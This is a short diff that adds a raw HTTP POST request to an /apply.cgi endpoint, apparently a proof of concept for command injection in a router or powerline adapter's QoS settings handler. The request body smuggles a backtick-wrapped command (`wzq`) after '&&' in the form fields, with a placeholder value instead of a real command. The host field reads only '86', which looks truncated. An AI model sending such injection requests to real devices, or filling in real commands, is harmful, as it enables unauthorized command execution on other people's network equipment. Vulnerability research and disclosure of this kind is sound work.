@@ -1,0 +1,6 @@
+POST /apply.cgi?plc_qos_setting HTTP/1.1
+Host: 86
+Content-Type: application/json
+Content-Length: 78
+
+plc_dev_cfg_mac=wzqwzqwzq&submit_flag=ca_client_manual&%20timestamp=&&`wzq`
